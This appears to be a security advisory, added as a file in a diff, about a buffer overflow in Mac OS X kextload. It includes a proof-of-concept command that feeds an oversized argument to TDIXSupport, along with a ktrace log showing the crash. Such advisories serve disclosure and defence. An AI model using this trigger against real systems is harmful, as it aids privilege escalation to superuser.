@@ -1,0 +1,26 @@
+source: http://www.securityfocus.com/bid/20034/info
+
+Apple Mac OS X kextload is prone to a buffer-overflow vulnerability because it fails to sufficiently bounds-check user-supplied data before copying it to a finite-sized memory buffer.
+
+This issue is not exploitable by itself, because kextload is not installed as a setuid-superuser application by default. To exploit this issue, an attacker must use another program running with elevated privileges to directly manipulate the arguments passed to kextload.
+
+An attacker can exploit this issue to execute arbitrary machine code with superuser privileges. A successful exploit may result in the complete compromise of the affect computer.
+
+Example kextload buffer-overflow vulnerability affecting TDIXsupport: 
+
+netragard-test:$ sudo ktrace -di ./TDIXSupport `perl -e 'print "A" x 1000'`/TDIXController.kext 
+... 
+1067 security_authtra CALL sendto(0x7,0xbfffde14,0x36,0,0,0) 
+1067 security_authtra GIO fd 7 wrote 54 bytes 
+~ "<37>Jul 8 11:31:58 authexec: executing /sbin/kextload" 
+1067 security_authtra RET sendto 54/0x36 
+1067 security_authtra CALL execve(0xbfffec61,0xbfffebb4,0x300af0) 
+1067 security_authtra NAMI "/sbin/kextload" 
+... 
+1067 kextload PSIG SIGSEGV SIG_DFL 
+1066 TDIXSupport GIO fd 7 read 0 bytes 
+~ "" 
+1066 TDIXSupport RET read 0 
+1066 TDIXSupport CALL close(0x7) 
+1066 TDIXSupport RET close 0 
+1066 TDIXSupport CALL exit(0xe00002c0)
